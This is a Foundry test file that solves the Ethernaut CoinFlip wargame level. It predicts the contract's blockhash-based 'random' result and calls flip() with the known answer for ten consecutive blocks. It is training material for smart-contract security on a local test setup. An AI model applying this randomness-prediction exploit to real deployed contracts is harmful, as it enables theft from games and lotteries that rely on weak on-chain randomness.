pragma solidity ^0.8.10;

// dependencies
import "@std/Test.sol";
import "@std/console.sol";

// contracts
import "../src/CoinFlip/CoinFlipFactory.sol";
import "../src/Ethernaut.sol";

contract CoinFlipTest is Test {
    address alice = address(0x1337);

    Ethernaut ethernaut;
    CoinFlip ethernautCoinFlip;

    function setUp() public {
        vm.label(alice, "Alice");
        vm.label(address(this), "FalloutTest");
        vm.startPrank(alice);

        // Setup instance of the Ethernaut contract
        ethernaut = new Ethernaut();
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        ethernautCoinFlip = CoinFlip(payable(levelAddress));

        vm.label(address(ethernautCoinFlip), "EthernautCoinFlip");
        vm.deal(alice, 5 ether);
    }

    function testExploit() public {        
        for(uint256 i; i < 10; ++i) {
            uint256 blockValue = uint256(blockhash(block.number - 1));
            console.logUint(block.number);
            uint256 coinFlip = blockValue / 57896044618658097711785492504343953926634992332820282019728792003956564819968;
            bool side = coinFlip == 1 ? true : false;

            ethernautCoinFlip.flip(side);

            // this is how to increase blocknumber
            vm.roll(block.number + 1);
            console.logUint(i);
            console.logUint(block.number);
        }

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(address(ethernautCoinFlip)));

        vm.stopPrank();

        assert(levelSuccessfullyPassed);
    }
}